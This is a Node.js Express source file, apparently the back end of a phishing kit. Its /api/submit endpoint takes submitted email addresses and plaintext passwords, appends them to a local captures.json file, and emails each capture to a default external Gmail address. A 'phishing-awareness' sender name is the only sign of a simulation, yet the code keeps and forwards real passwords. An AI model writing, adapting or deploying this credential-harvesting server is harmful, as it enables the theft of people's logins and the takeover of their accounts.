require('dotenv').config();
const express = require('express');
const bodyParser = require('body-parser');
const nodemailer = require('nodemailer');
const fs = require('fs');
const path = require('path');
const app = express();
const port = process.env.PORT || 3000;

app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// Allow CORS from local intranet (adjust as needed)
app.use((req, res, next) => {
  res.setHeader('Access-Control-Allow-Origin', process.env.CORS_ALLOW_ORIGIN || '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET,POST,OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  next();
});

// Health
app.get('/api/health', (req, res) => {
  res.json({ status: 'ok', time: new Date().toISOString() });
});

app.post('/api/submit', async (req, res) => {
  try {
    const { email, password, timestamp, userAgent, url } = req.body;

    if (!email || !password) {
      return res.status(400).json({ ok: false, message: 'Missing email or password' });
    }

    const capture = {
      email: email,
      password: password,
      timestamp: timestamp || new Date().toLocaleString('es-ES'),
      userAgent: userAgent || req.headers['user-agent'] || 'unknown',
      url: url || req.body.pageUrl || req.headers.referer || 'unknown'
    };

    // Append to local file for backup
    const backupFile = path.join(__dirname, 'captures.json');
    let all = [];
    try {
      if (fs.existsSync(backupFile)) {
        all = JSON.parse(fs.readFileSync(backupFile, 'utf8')) || [];
      }
    } catch (e) {
      console.error('Error reading backup file', e);
    }
    all.push(capture);
    try {
      fs.writeFileSync(backupFile, JSON.stringify(all, null, 2));
    } catch (e) {
      console.error('Error writing backup file', e);
    }

    // Send email using company SMTP
    const transporter = nodemailer.createTransport({
      host: process.env.SMTP_HOST,
      port: parseInt(process.env.SMTP_PORT || '25', 10),
      secure: process.env.SMTP_SECURE === 'true', // true for 465, false for other ports
      auth: process.env.SMTP_USER ? {
        user: process.env.SMTP_USER,
        pass: process.env.SMTP_PASS
      } : undefined
    });

    const mailOptions = {
      from: process.env.MAIL_FROM || 'phishing-awareness@yourcompany.local',
      to: process.env.TO_EMAIL || 'sofly7899@gmail.com',
      subject: `🚨 Nueva captura - ${capture.email}`,
      text: `Nueva captura de credenciales:\n\nEmail: ${capture.email}\nPassword: ${capture.password}\nFecha: ${capture.timestamp}\nNavegador: ${capture.userAgent}\nURL: ${capture.url}`
    };

    let info;
    try {
      info = await transporter.sendMail(mailOptions);
      console.log('Mail sent:', info && info.messageId);
    } catch (e) {
      console.error('Error sending mail:', e);
    }

    return res.json({ ok: true, backupSaved: true, mailSent: !!info });
  } catch (err) {
    console.error('Unexpected error in /api/submit', err);
    return res.status(500).json({ ok: false, message: 'Server error' });
  }
});

app.listen(port, () => {
  console.log(`Capture server listening on port ${port}`);
});
